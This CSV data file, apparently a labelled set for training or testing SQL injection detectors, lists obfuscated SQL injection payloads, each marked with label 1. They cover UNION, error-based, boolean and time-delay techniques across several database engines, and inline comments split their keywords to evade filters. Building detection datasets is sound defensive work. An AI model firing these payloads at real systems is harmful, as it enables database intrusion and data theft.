Query,Label
"1%' o/**/r 7552  =    (  selec/**/t count  (  *  )   fro/**/m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   an/**/d '%'  =  '",1
"1,  (  se/**/lect   (  case when   (  3888  =  3888  )   then   (  sel/**/ect count  (  *  )   f/**/rom generate_series  (  1,5000000   )    )    else 1/  (  s/**/elect 0  )   end   )    )   ",1
"-9881""   )    )    o/**/r 9850  =  8118#",1
"1  )   unio/**/n all sele/**/ct nul/**/l,n/**/ull,n/**/ull,n/**/ull,n/**/ull,nu/**/ll,nul/**/l,nu/**/ll,n/**/ull,n/**/ull--",1
"-4817 u/**/nion all s/**/elect 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1
selec/**/t   (  case when   (  5390  =  7419  )   then 5390 else 5390*  (  se/**/lect 5390 fro/**/m mysql.db  )   end  )  #,1
-7111' o/**/r   (  8459  =  8459  )  *4906,1
"1 un/**/ion all selec/**/t nu/**/ll,nu/**/ll,nul/**/l,n/**/ull,nul/**/l,n/**/ull,n/**/ull#",1
-7859  )   as ipdg wh/**/ere 4413  =  4413 o/**/r 9323  =  9323#,1
"-2323""  )   as zgsn whe/**/re 9274  =  9274 o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selec/**/t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
1  )   wher/**/e 5774  =  5774,1
"1""   )    )    as fhlg wher/**/e 1004  =  1004 a/**/nd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  s/**/elect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
"-8893%'   )    )    o/**/r elt  (  1032  =  1032,3623  )   a/**/nd    (    (   '%'  =  '",1
"-8791""   )    )     )   o/**/r make_s/**/et  (  6681  =  6620,6620  )   a/**/nd    (    (     (  ""pvdk""  =  ""pvdk",1
"-3081""   )    )     )   o/**/r 3736  =  1899",1
-4082   )    )    o/**/r 5903  =    (  'qqpjq'||  (  sele/**/ct case 5903 when 5903 then 1 else 0 end fr/**/om rdb$datab/**/ase  )  ||'qzvzq'  )   a/**/nd    (    (   7874  =  7874,1
sele/**/ct   (  case when   (  6615  =  3564  )   then 1 else 6615*  (  se/**/lect 6615 f/**/rom master..sysda/**/tabases  )   end  )  --,1
-7648'  )   o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selec/**/t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
sel/**/ect   (  case when   (  9540  =  5786  )   then 9540 else 9540*  (  se/**/lect 9540 f/**/rom i/**/nfo/**/rmation_schema.character_s/**/ets  )   end  )  #,1
selec/**/t case when 7426  =  6635 then 1 else n/**/ull end--,1
"1%'   )    )     )   uni/**/on all s/**/elect nu/**/ll,nul/**/l,nul/**/l,nu/**/ll#",1
"iif  (  3204  =  8489,3204,1/0  )  ",1
"1%'  )    (  selec/**/t   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,n/**/ull  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   fro/**/m   (  v/**/alues  (  0   )    )     )   an/**/d   (  '%'  =  '",1
"1""   )    )    an/**/d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
"1""   )    )     )    (  se/**/lect   (  case when   (  5451  =  5451  )   then regexp_substri/**/ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,n/**/ull  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   fr/**/om i/**/nfo/**/rmation_schema.system_users  )   a/**/nd    (    (     (  ""wjhj""  =  ""wjhj",1
"1"" whe/**/re 6800  =  6800 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"-3933'   )    )     )   unio/**/n all sele/**/ct 6198,6198,6198,6198,6198#",1
"1%""   )    )    an/**/d 6240  =    (  'qqpjq'||  (  s/**/elect case 6240 when 6240 then 1 else 0 end f/**/rom rdb$databa/**/se  )  ||'qzvzq'  )   an/**/d    (    (   ""%""  =  """,1
"1"" an/**/d upd/**/atexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selec/**/t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   an/**/d ""egzm""  =  ""egzm",1
"-3361   )    )    u/**/nion all sel/**/ect 2827,2827,2827,2827#",1
1' an/**/d 4386  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    an/**/d 'iuao'  =  'iuao,1
"se/**/lect count  (  *  )   fr/**/om generate_series  (  1,5000000  )  #",1
" end an/**/d    (    (   ""%""  =  """,1
"1""   )    )    as bbkl w/**/here 5686  =  5686",1
"1%""  )   an/**/d   (  3020  =  3020  )  *6703 a/**/nd   (  ""%""  =  """,1
1'+  (  se/**/lect 'cwta' wher/**/e 6091  =  6091,1
"1%""   )    )    a/**/nd elt  (  4249  =  4249,7259  )   an/**/d    (    (   ""%""  =  """,1
"-6333""   )    )     )   un/**/ion all sele/**/ct 9851,9851,9851,9851,9851,9851--",1
"1""   )    )    a/**/nd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sel/**/ect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    an/**/d    (    (   ""xccy""  =  ""xccy",1
"1""  )   as xioc wh/**/ere 7260  =  7260 o/**/r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-2298%' o/**/r 1 group b/**/y concat  (  0x7171706a71,  (  s/**/elect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )    havi/**/ng mi/**/n  (  0  )  #",1
"-1808%""   )    )    o/**/r 4595  =  3545 an/**/d    (    (   ""%""  =  """,1
1  )   as bhdj wher/**/e 4472  =  4472,1
"1%"" u/**/nion all s/**/elect nu/**/ll,nul/**/l,n/**/ull,nul/**/l,nu/**/ll#",1
"sel/**/ect count  (  *  )   fro/**/m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",1
"-7635"" u/**/nion all se/**/lect 1284,1284,1284,1284,1284,1284#",1
1'   )    )    as pgif w/**/here 6346  =  6346,1
"1""  )   as yekp wher/**/e 3049  =  3049 a/**/nd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )  --",1
"1""   )    )    as mvxa wher/**/e 3024  =  3024",1
"1""  )   rl/**/ike   (  selec/**/t * fro/**/m   (  s/**/elect  (  sleep  (  5   )    )     )  sgvo  )   a/**/nd   (  ""cneo"" lik/**/e ""cneo",1
"1%""  )   rlik/**/e sleep  (  5  )   an/**/d   (  ""%""  =  """,1
"1'  )   an/**/d   (  sel/**/ect 2*  (  if   (    (   s/**/elect * fro/**/m   (  se/**/lect concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1'  )   as knxr wh/**/ere 5662  =  5662 unio/**/n all s/**/elect nul/**/l,nul/**/l,n/**/ull,nu/**/ll,nul/**/l,n/**/ull,nu/**/ll,n/**/ull#",1
-6045 o/**/r 8919  =  2827--,1
"1%"" o/**/r 9643  =    (  se/**/lect count  (  *  )   fr/**/om domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.t/**/ables as t3  )   an/**/d ""%""  =  """,1
"1""   )    )    as khqq w/**/here 3637  =  3637 an/**/d 8407  =    (  sele/**/ct count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )   --",1
"1'  )   as xvcr whe/**/re 6456  =  6456 an/**/d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
"-3349   )    )     )   uni/**/on all sel/**/ect 6553,6553#",1
"-3475"" o/**/r elt  (  5532  =  4242,4242  )  ",1
selec/**/t   (  case when   (  2774  =  5503  )   then 2774 else 2774*  (  sel/**/ect 2774 fr/**/om i/**/nfo/**/rmation_schema.character_s/**/ets  )   end  )  #,1
"1'   )    )    a/**/nd 8189  =    (  se/**/lect count  (  *  )   f/**/rom sysibm.systab/**/les as t1,sysibm.systabl/**/es as t2,sysibm.syst/**/ables as t3  )  --",1
"1   )    )    as ambt wh/**/ere 5198  =  5198 an/**/d char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nu/**/ll  )  --",1
-7505'   )    )    as lqvw wh/**/ere 8565  =  8565 o/**/r 6872  =  6872--,1
" end an/**/d   (  ""xksk""  =  ""xksk",1
"-3513%"" unio/**/n all sele/**/ct 8473,8473#",1
"sel/**/ect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    a/**/nd   (  '%'  =  '",1
"1'  )   an/**/d elt  (  3528  =  3566,3566  )  ",1
1  )   a/**/nd 3715 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sele/**/ct   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
"1'   )    )     )   an/**/d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )  --",1
"1 an/**/d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",1
"1'   )    )     )   an/**/d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an/**/d    (    (     (  'abcf' lik/**/e 'abcf",1
"1' i/**/n boolean mode  )   unio/**/n all se/**/lect nul/**/l,n/**/ull,n/**/ull,nu/**/ll,nul/**/l,nul/**/l,n/**/ull,nul/**/l,nul/**/l#",1
se/**/lect   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as i/**/nt  )  /  (  s/**/elect 0 fr/**/om dual  )   end  )   fr/**/om dual--,1
"-9286""   )    )    as mfxl wher/**/e 9348  =  9348 uni/**/on all sel/**/ect 9348#",1
"1%""   )    )    u/**/nion all sel/**/ect n/**/ull,nu/**/ll,n/**/ull,nul/**/l,nul/**/l,nu/**/ll#",1
1'  )   a/**/nd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel/**/ect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an/**/d   (  'lnte'  =  'lnte,1
"1'   )    )    un/**/ion all sele/**/ct nu/**/ll,n/**/ull,nul/**/l,nul/**/l,n/**/ull,n/**/ull,nul/**/l,nu/**/ll,nul/**/l--",1
"-8636""   )    )     )   u/**/nion all sele/**/ct 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",1
"-6940'  )   u/**/nion all se/**/lect 3042,3042,3042,3042,3042#",1
"1""  )   as rnjx wher/**/e 2679  =  2679 a/**/nd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1  )   as qgsb wher/**/e 7600  =  7600 an/**/d 2006  =  2006,1
1' whe/**/re 4795  =  4795 an/**/d 4595  =  4595#,1
"1""  )   as rnte whe/**/re 6517  =  6517 a/**/nd 9254  =    (  s/**/elect count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1"" a/**/nd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  se/**/lect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",1
"1  )   as ghew w/**/here 6441  =  6441 unio/**/n all sele/**/ct nu/**/ll,nu/**/ll--",1
"-2548""   )    )     )   o/**/r 5107  =  8049--",1
1' o/**/rder b/**/y 1#,1
"1""  )   wh/**/ere 2834  =  2834   (  selec/**/t   (  case when   (  5451  =  5451  )   then regexp_substri/**/ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,n/**/ull  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   f/**/rom i/**/nfo/**/rmation_schema.system_users  )  --",1
"-1963 unio/**/n all se/**/lect 6831,6831,6831,6831,6831,6831,6831,6831#",1
"1"" o/**/r   (  s/**/elect * f/**/rom   (  se/**/lect  (  sleep  (  5   )    )     )  ydpu  )   a/**/nd ""pxix""  =  ""pxix",1
"1%' an/**/d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
"1'   )    )     )   an/**/d 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   an/**/d    (    (     (  'xngr'  =  'xngr",1
"-6514   )    )    as pbgg whe/**/re 6841  =  6841 un/**/ion all sel/**/ect 6841,6841,6841,6841--",1
"1"" a/**/nd 6969  =    (  se/**/lect 6969 fro/**/m pg_sleep  (  5   )    )    an/**/d ""twmy""  =  ""twmy",1
se/**/lect case when 6420  =  7941 then 1 else nul/**/l end--,1
"1""   )    )    as qvyu wher/**/e 5962  =  5962 o/**/r upda/**/texml  (  1808,concat  (  0x2e,0x7171706a71,  (  s/**/elect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
1'  )   an/**/d 4595  =  4595#,1
"1'||  (  sel/**/ect 'ersu' wh/**/ere 4123  =  4123 a/**/nd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%' o/**/r 4915  =    (  se/**/lect count  (  *  )   fr/**/om domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.t/**/ables as t3  )  --",1
"selec/**/t count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 an/**/d    (    (     (  5432  =  5432",1
"1""   )    )    an/**/d 4241  =  convert  (  i/**/nt,  (  sele/**/ct char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd    (    (   ""bxcb"" li/**/ke ""bxcb",1
"1'+  (  selec/**/t 'iyvn' wh/**/ere 9358  =  9358 o/**/r elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",1
"1'   )    )    o/**/r 8421  =    (  sel/**/ect count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )    an/**/d    (    (   'qgov'  =  'qgov",1
"1,exp  (  ~  (  s/**/elect * fr/**/om   (  sel/**/ect concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1"" whe/**/re 8727  =  8727",1
sel/**/ect sleep  (  5  )   an/**/d    (    (   'mmvf' lik/**/e 'mmvf,1
"1'||  (  selec/**/t 'jpso' fr/**/om dual wh/**/ere 9357  =  9357 o/**/r   (  s/**/elect 2*  (  if   (    (   sele/**/ct * fr/**/om   (  s/**/elect concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
-6222   )    )    o/**/r 4493  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    an/**/d    (    (   3230  =  3230,1
"-4056""   )    )     )   un/**/ion all se/**/lect 4363,4363,4363,4363,4363,4363,4363,4363#",1
"-5207"" wher/**/e 2050  =  2050 u/**/nion all se/**/lect 2050,2050,2050,2050,2050,2050,2050--",1
"1"" wh/**/ere 4345  =  4345 an/**/d 4386  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
"1'   )    )     )   an/**/d 5556  =    (  se/**/lect count  (  *  )   f/**/rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   a/**/nd    (    (     (  'dhqz'  =  'dhqz",1
"1""  )    (  sele/**/ct   (  case when   (  5451  =  5451  )   then regexp_substri/**/ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nu/**/ll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   fro/**/m i/**/nfo/**/rmation_schema.system_users  )   a/**/nd   (  ""mrsl""  =  ""mrsl",1
"-1339   )    )     )   un/**/ion all sel/**/ect 2938,2938,2938,2938,2938,2938#",1
"-9384%"" unio/**/n all sele/**/ct 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1
-8007'   )    )    as bgpp w/**/here 9555  =  9555 o/**/r 4144  =    (  sele/**/ct upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fro/**/m dual  )  --,1
"-8491"" w/**/here 6107  =  6107 o/**/r 4493  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
"-5910%'   )    )     )   u/**/nion all s/**/elect 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",1
"1"" whe/**/re 4808  =  4808 u/**/nion all selec/**/t nu/**/ll,nu/**/ll,nul/**/l,nu/**/ll,nul/**/l,nu/**/ll,n/**/ull#",1
-7940'  )   unio/**/n all s/**/elect 6024--,1
"1""  )   w/**/here 2758  =  2758 u/**/nion all sele/**/ct n/**/ull,n/**/ull,nu/**/ll,nu/**/ll,nul/**/l,n/**/ull,n/**/ull--",1
1%' a/**/nd   (  selec/**/t * fro/**/m   (  sel/**/ect  (  sleep  (  5   )    )     )  fzno  )   an/**/d '%'  =  ',1
"1%""   )    )     )   u/**/nion all s/**/elect n/**/ull#",1
"1   )    )     )   o/**/r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nu/**/ll  )  --",1
 (  selec/**/t * fr/**/om   (  sel/**/ect  (  sleep  (  5   )    )     )  srmq  )  --,1
"-1681%"" un/**/ion all s/**/elect 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",1
"1'  )   as ywtu wher/**/e 3009  =  3009 o/**/r 4915  =    (  se/**/lect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tab/**/les as t3  )  --",1
"-9622' un/**/ion all selec/**/t 7208,7208,7208,7208#",1
1'||  (  selec/**/t 'jmao' wh/**/ere 3009  =  3009,1
"1  )   wh/**/ere 4698  =  4698 an/**/d 3580  =    (  s/**/elect count  (  *  )   f/**/rom domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3  )  --",1
"1'||  (  sele/**/ct 'rfjl' w/**/here 2476  =  2476 o/**/r 7552  =    (  sel/**/ect count  (  *  )   f/**/rom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1
"1',  (  sele/**/ct   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  se/**/lect 6894 fro/**/m i/**/nfo/**/rmation_schema.character_se/**/ts  )   end   )    )   ",1
"1   )    )     )   an/**/d 3580  =    (  se/**/lect count  (  *  )   f/**/rom domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tabl/**/es as t3  )  --",1
"1""  )   wh/**/ere 9285  =  9285 an/**/d 8506  =  8343#",1
1'+  (  s/**/elect wgmn wh/**/ere 4368  =  4368 an/**/d 7859  =  6151  )  +',1
 (  se/**/lect * f/**/rom   (  selec/**/t  (  sleep  (  5   )    )     )  srmq  )   an/**/d 'fdgq'  =  'fdgq,1
-6200%'   )    )    o/**/r 8077  =  4661,1
1  )   rli/**/ke sleep  (  5  )  #,1
"selec/**/t dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   fro/**/m dual--",1
1   )    )     )   an/**/d sleep  (  5  )   an/**/d    (    (     (  6618  =  6618,1
"1'  )   as mvai wh/**/ere 5856  =  5856 a/**/nd exp  (  ~  (  selec/**/t * fro/**/m   (  sel/**/ect concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
1'  )   as zxos whe/**/re 2745  =  2745,1
"-6846%""   )    )    o/**/r   (  8459  =  8459  )  *4906 a/**/nd    (    (   ""%""  =  """,1
"1""   )    )    an/**/d 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sel/**/ect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   an/**/d    (    (   ""mxnj"" lik/**/e ""mxnj",1
